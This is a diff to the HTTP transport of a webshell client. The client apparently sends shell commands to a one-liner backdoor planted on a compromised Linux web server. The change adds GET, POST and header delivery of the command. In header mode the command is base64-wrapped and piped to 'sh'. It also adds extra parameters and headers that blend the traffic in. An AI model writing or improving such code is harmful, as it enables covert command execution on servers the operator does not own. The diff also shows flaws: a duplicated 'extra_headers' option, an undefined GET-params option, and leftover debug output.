@@ -5,6 +5,7 @@ import base64
 import shlex
 import hashlib
 import httpx
+from urllib.parse import quote
 
 from ..core import exceptions
 
@@ -18,6 +19,7 @@ from ..core.base import (
 )
 
 from ..utils.random_data import random_string
+from ..utils.tools import user_json_loads
 
 logger = logging.getLogger("core.sessions.linux_cmd_oneliner")
 
@@ -127,6 +129,18 @@ class LinuxCmdOneLiner:
                     default_value=None,
                     alternatives=None,
                 ),
+                ConnOption(
+                    id="password_method",
+                    name="密码传参方式",
+                    type="select",
+                    placeholder="POST",
+                    default_value="POST",
+                    alternatives=[
+                        {"name": "POST", "value": "POST"},
+                        {"name": "GET", "value": "GET"},
+                        {"name": "Header", "value": "Header"},
+                    ],
+                ),
             ],
         },
         {
@@ -156,6 +170,30 @@ class LinuxCmdOneLiner:
                     default_value="4",
                     alternatives=None,
                 ),
+                ConnOption(
+                    id="extra_post_params",
+                    name="额外的POST参数",
+                    type="text",
+                    placeholder='保存着额外参数的JSON对象，如{"passwd": "123"}',
+                    default_value="{}",
+                    alternatives=None,
+                ),
+                ConnOption(
+                    id="extra_headers",
+                    name="额外的headers",
+                    type="text",
+                    placeholder='保存着额外参数的JSON对象或null，如{"passwd": "123"}',
+                    default_value="{}",
+                    alternatives=None,
+                ),
+                ConnOption(
+                    id="extra_headers",
+                    name="额外的headers",
+                    type="text",
+                    placeholder='保存着额外参数的JSON对象或null，如{"passwd": "123"}',
+                    default_value="{}",
+                    alternatives=None,
+                ),
             ],
         },
     ]
@@ -164,7 +202,15 @@ class LinuxCmdOneLiner:
         # super().__init__(session_conn)
         self.url = session_conn["url"]
         self.password = session_conn["password"]
+        self.password_method = session_conn.get("password_method", "POST").upper()
         self.https_verify = session_conn.get("https_verify", False)
+
+        self.params = user_json_loads(session_conn.get("extra_get_params", "{}"), dict)
+        self.data = user_json_loads(session_conn.get("extra_post_params", "{}"), dict)
+        self.headers = user_json_loads(
+            session_conn.get("extra_headers", "null"), (dict, type(None))
+        )
+
         self.client = get_http_client(verify=self.https_verify)
 
         # for upload file and download file
@@ -435,11 +481,29 @@ class LinuxCmdOneLiner:
 
     async def submit_http(self, payload: t.Union[str, bytes]):
         try:
+            kwargs = {
+                "params": self.params.copy(),
+                "headers": {"Connection": "close"},
+                "data": self.data.copy(),
+            }
+            if self.password_method in ["GET", "HEAD"]:
+                kwargs["params"][self.password] = payload
+            elif self.password_method == "HEADER":
+                kwargs["headers"][self.password] = f"echo {base64.b64encode(payload.encode()).decode()} | base64 -d | sh"
+            else:
+                kwargs["data"][self.password] = payload
             response = await self.client.request(
-                method="POST", url=self.url, data={self.password: payload}
+                method=(
+                    "POST" if self.password_method == "HEADER" else self.password_method
+                ),
+                url=self.url,
+                **kwargs,
             )
+            print(f"{response.text=}")
             return response.status_code, response.text
         except httpx.TimeoutException as exc:
             raise exceptions.NetworkError("HTTP请求受控端超时") from exc
         except httpx.HTTPError as exc:
+            import traceback
+            traceback.print_exc()
             raise exceptions.NetworkError("发送HTTP请求到受控端失败") from exc
